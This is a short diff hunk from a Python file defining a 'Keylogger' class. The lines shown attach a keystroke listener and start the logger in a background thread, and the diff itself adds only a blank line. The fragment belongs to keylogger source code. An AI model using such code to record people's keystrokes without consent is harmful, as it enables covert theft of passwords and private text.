@@ -58,6 +58,7 @@ class Keylogger:
            with Listener(on_press = self.key_press) as listener:
             listener.join() # listening for keystrokes
 
+
 start = Keylogger()
 kThread = threading.Thread(target = start.log)
 kThread.start()
